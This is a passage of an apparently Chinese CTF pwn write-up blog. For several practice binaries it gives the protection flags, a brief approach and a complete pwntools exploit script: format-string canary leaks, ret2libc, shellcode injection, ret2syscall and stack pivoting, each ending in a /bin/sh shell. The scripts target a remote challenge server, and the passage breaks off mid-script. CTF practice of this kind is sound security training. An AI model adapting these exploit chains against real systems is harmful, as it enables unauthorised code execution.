class="hljs-built_in">hex</span>(sys))<br>get_plt = elf.plt[<span class="hljs-string">'gets'</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(get_plt))<br>puts_plt = elf.plt[<span class="hljs-string">'puts'</span>]<br>puts_got = elf.got[<span class="hljs-string">'puts'</span>]<br>bss = <span class="hljs-number">0x0804A040</span><br>p.sendline(<span class="hljs-string">"123"</span>)<br>payload = <span class="hljs-string">b'a'</span>*<span class="hljs-number">0x112</span> + p32(get_plt) + p32(sys) + p32(bss) + p32(bss)<br>p.recvuntil(<span class="hljs-string">b'How many fish does the kitten eat\n'</span>)<br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">b'/bin/sh'</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure><h2 id="format-ret2libc"><a href="#format-ret2libc" class="headerlink" title="format-ret2libc"></a>format_ret2libc</h2><h3 id="程序保护-5"><a href="#程序保护-5" class="headerlink" title="程序保护-5"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x400000</span>)</span><br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路-5"></a>解题思路</h3><p>ret2libc</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp-5"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2107</span>)<br><span class="hljs-comment">#p = process('./format_ret2libc')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br>libc = ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)<br>elf = ELF(<span class="hljs-string">'./format_ret2libc'</span>)<br><br>puts_got = elf.got[<span class="hljs-string">"puts"</span>]<br>puts_plt = elf.plt[<span class="hljs-string">"puts"</span>]<br>vuln_addr = <span class="hljs-number">0x40084B</span><br>pop_rdi_ret = <span class="hljs-number">0x0000000000400943</span><br><br>payload1 = <span class="hljs-string">"%39$p"</span><br><span class="hljs-comment">#p.recvuntil("Say some words\n")</span><br>p.sendline(payload1)<br>p.recvuntil(<span class="hljs-string">"0x"</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br><br>payload2 = <span class="hljs-string">b"a"</span> * (<span class="hljs-number">0x70</span>-<span class="hljs-number">8</span>) + p64(canary) + <span class="hljs-string">b"a"</span> * <span class="hljs-number">8</span><br>payload2 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)<br>p.sendlineafter(<span class="hljs-string">"What's your name?\n"</span>, payload2)<br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">'\x7f'</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b'\x00'</span>))<br>log.info(<span class="hljs-string">"puts_addr -&gt; %x"</span>,puts_addr)<br><br><span class="hljs-comment"># libcbase = puts_addr - libc.symbols['puts']</span><br><span class="hljs-comment"># system_addr = libcbase + libc.symbols['system']</span><br><span class="hljs-comment"># binsh_addr = libcbase + next(libc.search("/bin/sh"))</span><br><br><span class="hljs-comment"># libc = LibcSearcher('puts', puts_addr)</span><br><span class="hljs-comment"># libcbase = puts_addr - libc.dump('puts')</span><br><span class="hljs-comment"># system_addr = libcbase + libc.dump('system')</span><br><span class="hljs-comment"># binsh_addr = libcbase + libc.dump('str_bin_sh')</span><br><br>libc = puts_addr - <span class="hljs-number">0x06f6a0</span><br>system_addr = libc + <span class="hljs-number">0x0453a0</span><br>binsh_addr = libc + <span class="hljs-number">0x18ce57</span><br><br>payload3 = <span class="hljs-string">b"a"</span> * (<span class="hljs-number">0x70</span>-<span class="hljs-number">8</span>) + p64(canary) + <span class="hljs-string">b"a"</span> * <span class="hljs-number">8</span><br>payload3 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)<br><br>p.sendlineafter(<span class="hljs-string">"What's your name?\n"</span>, payload3)<br><br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure><h2 id="Game"><a href="#Game" class="headerlink" title="Game"></a>Game</h2><h3 id="程序保护-6"><a href="#程序保护-6" class="headerlink" title="程序保护-6"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br><br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路-6"></a>解题思路</h3><p>ret2libc</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp-6"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br><br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2064</span>)<br><span class="hljs-comment">#p = process('./Game')</span><br>elf = ELF(<span class="hljs-string">'./Game'</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">'puts'</span>]<br>puts_got = elf.got[<span class="hljs-string">'puts'</span>]<br>main_addr = elf.symbols[<span class="hljs-string">'main'</span>]<br>start = <span class="hljs-number">0x080485F4</span><br><br>offset = <span class="hljs-number">0x64</span> + <span class="hljs-number">8</span> + <span class="hljs-number">4</span><br><br>p.recvuntil(<span class="hljs-string">'Do you play game?\n'</span>)<br>p.sendline(<span class="hljs-string">"yes"</span>)<br>p.recvuntil(<span class="hljs-string">'Do you think playing games will affect your learning?\n'</span>)<br>p.sendline(<span class="hljs-string">"yes"</span>)<br>p.recvuntil(<span class="hljs-string">"I think the same as you!\n"</span>)<br>payload = <span class="hljs-string">b'a'</span>*offset + p32(puts_plt) + p32(start) + p32(puts_got)<br><span class="hljs-comment">#payload = p32(puts_got)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">'\n'</span>)<br>puts_addr = u32(p.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br>log.info(<span class="hljs-string">'puts -&gt; %x'</span>,puts_addr)<br><br><span class="hljs-comment"># libc = LibcSearcher('puts', puts_addr)</span><br><span class="hljs-comment"># libcbase = puts_addr - libc.dump('puts')</span><br><span class="hljs-comment"># system_addr = libcbase + libc.dump('system')</span><br><span class="hljs-comment"># binsh_addr = libcbase + libc.dump('str_bin_sh')</span><br><br>libc = puts_addr - <span class="hljs-number">0x05f150</span><br>system_addr = libc + <span class="hljs-number">0x03a950</span><br>binsh_addr = libc + <span class="hljs-number">0x15912b</span><br><br><br>p.recvuntil(<span class="hljs-string">"I think the same as you!\n"</span>)<br>payload2 = <span class="hljs-string">b'a'</span>* offset + p32(system_addr) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(binsh_addr)<br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></tbody></table></figure><h2 id="name4"><a href="#name4" class="headerlink" title="name4"></a>name4</h2><h3 id="程序保护-7"><a href="#程序保护-7" class="headerlink" title="程序保护-7"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br>    RWX:      Has RWX segments<br><br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路-7"></a>解题思路</h3><p>绕过检查的shellcode</p><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp-7"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2116</span>)<br><span class="hljs-comment">#p = process('./name4')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'i386'</span>)<br>elf = ELF(<span class="hljs-string">'./name4'</span>)<br><br>shellcode = asm(shellcraft.sh())<br>p.recvuntil(<span class="hljs-string">"Enter your name:\n"</span>)<br>p.sendline(<span class="hljs-string">'\x00'</span>+shellcode)<br>goal = <span class="hljs-number">0x0804A0E0</span><br>goal1 = <span class="hljs-number">0x0804A080</span> + <span class="hljs-number">1</span><br>p.recvuntil(<span class="hljs-string">'Enter your best friend name:\n'</span>)<br>p.sendline(shellcode)<br><br>p.recvuntil(<span class="hljs-string">'give you stack overflow:\n'</span>)<br>payload = <span class="hljs-string">'a'</span>*<span class="hljs-number">0x20</span> + p32(<span class="hljs-number">0xdeadbeff</span>) + p32(goal)<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.sendline(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure><h2 id="play"><a href="#play" class="headerlink" title="play"></a>play</h2><h3 id="程序保护-8"><a href="#程序保护-8" class="headerlink" title="程序保护-8"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x400000</span>)</span><br>    RWX:      Has RWX segments<br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路-8"></a>解题思路</h3><p>通过往bss段上写shellcode再跳转执行</p><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp-8"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2063</span>)<br><span class="hljs-comment">#p = process('./play')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br>elf = ELF(<span class="hljs-string">'./play'</span>)<br><br>shellcode = asm(shellcraft.sh())<br>p.recvuntil(<span class="hljs-string">"I think you must enjoy playing.\n"</span>)<br>p.sendline(shellcode)<br>goal = <span class="hljs-number">0x6010A0</span><br>p.recvuntil(<span class="hljs-string">'Name your favorite game?\n'</span>)<br>payload = <span class="hljs-string">b'a'</span>*(<span class="hljs-number">0x30</span>+<span class="hljs-number">8</span>) + p64(goal)<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.sendline(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="程序保护-9"><a href="#程序保护-9" class="headerlink" title="程序保护-9"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br>    RWX:      Has RWX segments<br><br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路-9"></a>解题思路</h3><p>ret2syscall 32位的执行 (0xb，0，0，binsh) 再调用80号中断</p><h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp-9"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2109</span>)<br><span class="hljs-comment">#p = process('./ret2syscall_32')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'i386'</span>)<br>elf = ELF(<span class="hljs-string">'./ret2syscall_32'</span>)<br><br>offset = <span class="hljs-number">0x208</span> + <span class="hljs-number">4</span><br>binsh_addr = <span class="hljs-number">0x080EA068</span><br>pop_eax = <span class="hljs-number">0x080b8576</span><br>pop_edx_ecx_ebx = <span class="hljs-number">0x0806f250</span><br>int80_addr = <span class="hljs-number">0x0806cea3</span><br><br>payload = <span class="hljs-string">b'a'</span>*offset + p32(pop_eax) + p32(<span class="hljs-number">0xb</span>)<br>payload += p32(pop_edx_ecx_ebx) + p32(<span class="hljs-number">0x0</span>) + p32(<span class="hljs-number">0x0</span>) + p32(binsh_addr) + p32(int80_addr)<br>p.sendline(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure><h2 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h2><h3 id="程序保护-10"><a href="#程序保护-10" class="headerlink" title="程序保护-10"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x400000</span>)</span><br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路-10"></a>解题思路</h3><p>ret2libc</p><h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp-10"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2057</span>)<br><span class="hljs-comment">#p = process('./sleep')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br><span class="hljs-comment">#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span><br>elf = ELF(<span class="hljs-string">'./sleep'</span>)<br><br>puts_got = elf.got[<span class="hljs-string">"puts"</span>]<br>puts_plt = elf.plt[<span class="hljs-string">"puts"</span>]<br>vuln_addr = <span class="hljs-number">0x4006BD</span><br>pop_rdi_ret = <span class="hljs-number">0x0000000000400783</span><br><br><br>payload2 = <span class="hljs-string">b"a"</span> * (<span class="hljs-number">0x70</span>+<span class="hljs-number">8</span>)<br>payload2 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)<br>p.sendlineafter(<span class="hljs-string">"Please cherish every second of sleeping time !!!\n"</span>, payload2)<br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">'\x7f'</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b'\x00'</span>))<br>log.info(<span class="hljs-string">"puts_addr -&gt; %x"</span>,puts_addr)<br><br><span class="hljs-comment"># libcbase = puts_addr - libc.symbols['puts']</span><br><span class="hljs-comment"># system_addr = libcbase + libc.symbols['system']</span><br><span class="hljs-comment"># binsh_addr = libcbase + next(libc.search("/bin/sh"))</span><br><br><span class="hljs-comment"># libc = LibcSearcher('puts', puts_addr)</span><br><span class="hljs-comment"># libcbase = puts_addr - libc.dump('puts')</span><br><span class="hljs-comment"># system_addr = libcbase + libc.dump('system')</span><br><span class="hljs-comment"># binsh_addr = libcbase + libc.dump('str_bin_sh')</span><br><br>libc = puts_addr - <span class="hljs-number">0x06f6a0</span><br>system_addr = libc + <span class="hljs-number">0x0453a0</span><br>binsh_addr = libc + <span class="hljs-number">0x18ce57</span><br><br>payload3 = <span class="hljs-string">b"a"</span> * (<span class="hljs-number">0x70</span>+<span class="hljs-number">8</span>)<br>payload3 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)<br><br>p.sendlineafter(<span class="hljs-string">"Please cherish every second of sleeping time !!!\n"</span>, payload3)<br><br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure><h2 id="stackpivot-x86"><a href="#stackpivot-x86" class="headerlink" title="stackpivot-x86"></a>stackpivot_x86</h2><h3 id="程序保护-11"><a href="#程序保护-11" class="headerlink" title="程序保护-11"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路-11"></a>解题思路</h3><p>栈迁移蛮有意思的，结构b’a’*padding + p64(goal) + p64(leave_ret)，通过执行两次 leave ; ret 将栈迁移到目标位置</p><h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp-11"></a>exp</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote('123.60.135.228',2131)</span><br>p = process(<span class="hljs-string">'./stack_pivotingx86'</span>)<br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'i386'</span>)<br>binsh = <span class="hljs-number">0x0804A030</span><br>system_addr = <span class="hljs-number">0x08048579</span><br>leave_ret = <span class="hljs-number">0x080484d8</span><br>offset = <span class="hljs-number">0xffffd028</span> - <span class="hljs-number">0xffffcff0</span> <span class="hljs-comment">#ebp距离输入地址的值</span><br><br>pay = <span class="hljs-string">b'a'</span>*<span class="hljs-number">0x27</span> + <span class="hljs-string">b'b'</span><br>p.send(pay)<br>p.recvuntil(<span class="hljs-string">'b'</span>)<br>ebp_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">"ebp_addr -&gt; "</span>,<span class="hljs-built_in">hex</span>(ebp_addr)) <span class="hljs-comment">#泄露ebp</span><br><br>s_addr = ebp_addr - <span class="hljs-number">0x38</span> <span class="hljs-comment">#计算ebp 和 输入 的距离</span><br><br>pay1 = p32(<span class="hljs-number">0</span>)<br>pay1 += p32(system_addr)<br>pay1 += p32(binsh)<br>pay1 += p32(<span class="hljs-number">0</span>)<br>pay1 = pay1.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b'\x00'</span>)<br>pay1 += p32(s_addr)<br>pay1 += p32(leave_ret)<br>gdb.attach(p)<br>p.send(pay1)<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure><h2 id="夕阳下的舞者"><a href="#夕阳下的舞者" class="headerlink" title="夕阳下的舞者"></a>夕阳下的舞者</h2><h3 id="程序保护-12"><a href="#程序保护-12" class="headerlink" title="程序保护-12"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br><br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路-12"><a href="#解题思路-12" class="headerlink" title="解题思路-12"></a>解题思路</h3><p>题目主要类型为offbynull制造堆块重叠，函数结构比较复杂，需要ida逆向理清，这里提供简单思路</p><ul><li>Step1：泄露libc基址。申请chunk，正常释放，大于fastbin的chunk会被放入unsortedbin中，且fd和bk均指向于main_arena_88的位置，可以获得libc基址</li><li>Step2：泄露堆地址。为啥泄露堆地址，因为开启了PIE，创建2个不相邻的 small chunk，释放后会放到 unsoted bin 中，通过打印函数可以泄露地址。</li><li>Step3：off-by-null，getshell 利用off-by-null漏洞制造堆块重叠，用fastbin去申请mallochook-0x23位置的一个chunk去修改mallochook为og</li></ul><h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp-12"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = 